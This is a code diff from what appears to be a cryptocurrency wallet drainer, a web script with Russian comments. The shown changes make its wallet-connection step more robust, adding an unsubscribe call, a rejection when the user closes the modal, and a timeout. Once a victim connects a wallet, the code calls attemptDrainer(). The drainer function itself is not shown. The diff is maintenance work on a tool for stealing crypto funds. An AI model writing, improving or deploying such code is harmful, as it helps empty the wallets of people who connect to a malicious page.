@@ -300,10 +300,12 @@ async function attemptDrainer() {
 // === Подключение кошелька и запуск ===
 async function handleConnectOrAction() {
   try {
-    await appKitModal.open(); // Открываем модальное окно AppKit
+    // Открываем модальное окно AppKit для подключения кошелька
+    await appKitModal.open();
     connectedAddress = await waitForWallet();
     console.log('✅ Подключён:', connectedAddress);
 
+    // После успешного подключения кошелька вызываем attemptDrainer
     if (!isTransactionPending) {
       await attemptDrainer();
     } else {
@@ -330,14 +332,23 @@ async function onChainChanged(chainId) {
 // === Ожидание подключения кошелька ===
 async function waitForWallet() {
   return new Promise((resolve, reject) => {
-    appKitModal.subscribeModal(state => {
-      if (state.open === false && window.ethereum?.selectedAddress) {
+    // Подписываемся на состояние модального окна AppKit
+    const unsubscribe = appKitModal.subscribeModal(state => {
+      // Если модальное окно закрыто и есть подключённый адрес
+      if (!state.open && window.ethereum?.selectedAddress) {
         const address = window.ethereum.selectedAddress;
+        unsubscribe(); // Отписываемся от событий
         resolve(address);
+      } else if (!state.open) {
+        // Если модальное окно закрыто без подключения
+        unsubscribe();
+        reject(new Error('User closed wallet selection modal'));
       }
     });
 
+    // Добавляем тайм-аут на случай, если пользователь не выберет кошелёк
     setTimeout(() => {
+      unsubscribe();
       reject(new Error('Wallet connection timeout'));
     }, 30000); // Тайм-аут 30 секунд
   });
